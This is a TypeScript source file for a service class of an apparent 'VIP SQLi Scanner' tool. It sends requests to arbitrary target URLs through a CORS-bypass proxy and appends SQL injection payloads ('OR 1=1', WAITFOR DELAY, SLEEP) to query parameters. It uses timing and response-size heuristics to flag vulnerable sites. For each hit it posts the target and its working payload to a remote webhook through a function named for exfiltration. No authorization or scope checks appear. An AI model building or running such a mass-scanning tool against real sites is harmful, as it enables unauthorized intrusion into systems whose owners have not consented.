import { ScanResult, ScanStats, Verdict, ScanConfig, LogEntry, LogLevel, ScannerSettings, IScanner, PROXY_URL } from '../types';
import { analyzeVulnerability } from './heuristics';

class RealScannerService implements IScanner {
  private listeners: ((stats: ScanStats, newResult?: ScanResult) => void)[] = [];
  private logListeners: ((log: LogEntry) => void)[] = [];
  private isRunning = false;
  private abortController: AbortController | null = null;

  private stats: ScanStats = {
    total: 0,
    processed: 0,
    safe: 0,
    vulnerable: 0,
    suspicious: 0,
    errors: 0
  };

  subscribe(callback: (stats: ScanStats, newResult?: ScanResult) => void) {
    this.listeners.push(callback);
    return () => {
      this.listeners = this.listeners.filter(cb => cb !== callback);
    };
  }

  subscribeToLogs(callback: (log: LogEntry) => void) {
    this.logListeners.push(callback);
    return () => {
      this.logListeners = this.logListeners.filter(cb => cb !== callback);
    };
  }

  private notify(newResult?: ScanResult) {
    this.listeners.forEach(cb => cb({ ...this.stats }, newResult));
  }

  private emitLog(level: LogLevel, message: string, url?: string, payload?: string) {
    const log: LogEntry = {
      id: Math.random().toString(36).substring(2, 11),
      timestamp: new Date().toISOString(),
      level,
      message,
      url,
      payload
    };
    this.logListeners.forEach(cb => cb(log));
  }

  async startScan(urls: string[], config: ScanConfig, settings?: ScannerSettings) {
    if (this.isRunning) return;
    this.isRunning = true;
    this.abortController = new AbortController();

    this.stats = {
      total: urls.length,
      processed: 0,
      safe: 0,
      vulnerable: 0,
      suspicious: 0,
      errors: 0,
      startTime: Date.now()
    };
    this.notify();

    this.emitLog('INFO', `Phase 3 MISSION START: Real-World Forensics Active.`);
    this.emitLog('INFO', `Connected to Proxy Bridge: ${PROXY_URL}`);

    for (const url of urls) {
      if (!this.isRunning) break;

      this.emitLog('INFO', `Target established: ${url}. Initiating remote handshake.`);

      try {
        const result = await this.scanTarget(url, config, settings);
        
        this.stats.processed++;
        if (result.verdict === 'SAFE') this.stats.safe++;
        else if (result.verdict === 'VULNERABLE') this.stats.vulnerable++;
        else if (result.verdict === 'SUSPICIOUS') this.stats.suspicious++;
        else this.stats.errors++;

        this.notify(result);
      } catch (err: any) {
        this.emitLog('ERROR', `Mission Intercepted: ${err.message}`, url);
        this.stats.processed++;
        this.stats.errors++;
        this.notify();
      }
    }

    this.stopScan();
  }

  stopScan() {
    this.isRunning = false;
    if (this.abortController) {
      this.abortController.abort();
      this.abortController = null;
    }
    this.stats.endTime = Date.now();
    this.notify();
    this.emitLog('INFO', `Mission deactivated. Results synchronized.`);
  }

  private async scanTarget(url: string, config: ScanConfig, settings: ScannerSettings | undefined): Promise<ScanResult> {
    const payloads = this.getPriorityPayloads(settings);
    
    // 1. Establish Baseline
    this.emitLog('INFO', `Establishing baseline response for ${url}...`);
    const baseline = await this.proxyRequest(url, config.method);
    
    if (!baseline.success) {
      this.emitLog('ERROR', `Baseline Failure: Target unreachable via Bridge.`);
      throw new Error('CORS Bridge: Target unresponsive.');
    }
    
    const baselineData = { duration: baseline.duration, bodyLength: typeof baseline.body === 'string' ? baseline.body.length : JSON.stringify(baseline.body).length };
    this.emitLog('INFO', `Baseline confirmed. Response: ${baseline.status} (${baseline.duration}ms).`);

    let verdict: Verdict = 'SAFE';
    let bestHeuristic: any = null;
    let successfulPayload = '';

    // 2. Test Vectors
    for (const pInfo of payloads.slice(0, 5)) {
      this.emitLog('EXEC', `Injecting ${pInfo.category} vector...`, pInfo.payload);
      
      const testUrl = this.injectPayload(url, pInfo.payload);
      const response = await this.proxyRequest(testUrl, config.method);

      if (!response.success) continue;

      const currentBody = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
      const heuristic = analyzeVulnerability(baselineData, {
        duration: response.duration,
        bodyLength: currentBody.length,
        body: currentBody
      });

      if (heuristic.confidence > 0.3) {
        if (!bestHeuristic || heuristic.confidence > bestHeuristic.confidence) {
          bestHeuristic = heuristic;
          successfulPayload = pInfo.payload;
          
          if (heuristic.grade === 'CRITICAL' || heuristic.grade === 'HIGH') {
            verdict = 'VULNERABLE';
            this.emitLog('VULN', `CRITICAL: ${heuristic.reasoning[0]}`, url, pInfo.payload);
            break; 
          } else {
            verdict = 'SUSPICIOUS';
          }
        }
      }
    }

    if (verdict === 'VULNERABLE' && settings?.webhookUrl) {
      this.sendExfiltrationAlert(url, successfulPayload, bestHeuristic, settings.webhookUrl);
    }

    return {
      id: Math.random().toString(36).substring(2, 11),
      url,
      verdict,
      timestamp: new Date().toISOString(),
      details: bestHeuristic ? bestHeuristic.reasoning.join('\n') : 'No anomalous variance identified during forensic sweep.',
      mlConfidence: bestHeuristic ? bestHeuristic.confidence : undefined,
      extraction: verdict === 'VULNERABLE' ? {
        dbVersion: 'Forensic Signature Match',
        dbUser: 'Restricted Info',
        pocRequest: `${config.method} ${url} :: Payload: ${successfulPayload}`
      } : undefined
    };
  }

  private async proxyRequest(url: string, method: string, body?: any) {
    try {
      const resp = await fetch(PROXY_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url, method, body }),
        signal: this.abortController?.signal
      });
      
      if (!resp.ok) return { success: false };
      return { success: true, ...(await resp.json()) };
    } catch (e) {
      return { success: false };
    }
  }

  private async sendExfiltrationAlert(url: string, payload: string, heuristic: any, webhookUrl: string) {
    try {
      const content = {
        embeds: [{
          title: "🚨 SQL Injection Vulnerability Confirmed",
          color: 15158332,
          fields: [
            { name: "Target", value: `\`${url}\``, inline: false },
            { name: "Payload", value: `\`${payload}\``, inline: false },
            { name: "Confidence", value: `${(heuristic.confidence * 100).toFixed(1)}%`, inline: true },
            { name: "Grade", value: heuristic.grade, inline: true },
            { name: "Evidence", value: heuristic.reasoning[0], inline: false }
          ],
          footer: { text: "VIP SQLi Scanner Forensic Intelligence" },
          timestamp: new Date().toISOString()
        }]
      };

      // Route through Proxy Bridge for CORS bypass
      await fetch(`${PROXY_URL.replace('/proxy', '/alert')}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ webhookUrl, payload: content })
      });
      
      this.emitLog('INFO', `Exfiltration Telemetry dispatched to remote webhook.`);
    } catch (e) {
      this.emitLog('ERROR', `Telemetry Failure: Could not reach exfiltration endpoint.`);
    }
  }

  private injectPayload(url: string, payload: string): string {
    if (url.includes('?')) {
      const parts = url.split('?');
      const params = new URLSearchParams(parts[1]);
      const firstKey = params.keys().next().value;
      if (firstKey) {
        params.set(firstKey, params.get(firstKey) + payload);
      }
      return `${parts[0]}?${params.toString()}`;
    }
    return `${url}?id=${payload}`;
  }

  private getPriorityPayloads(settings?: ScannerSettings) {
    const list: { category: string, payload: string }[] = [];
    if (settings?.customPayloads) {
      settings.customPayloads.forEach(p => list.push({ category: p.category, payload: p.payload }));
    }
    list.push({ category: 'Boolean Based', payload: "' OR 1=1 --" });
    list.push({ category: 'Time Based', payload: "'; WAITFOR DELAY '0:0:5' --" });
    list.push({ category: 'Time Based', payload: "' OR SLEEP(5) --" });
    return list;
  }
}

export const realScannerService = new RealScannerService();
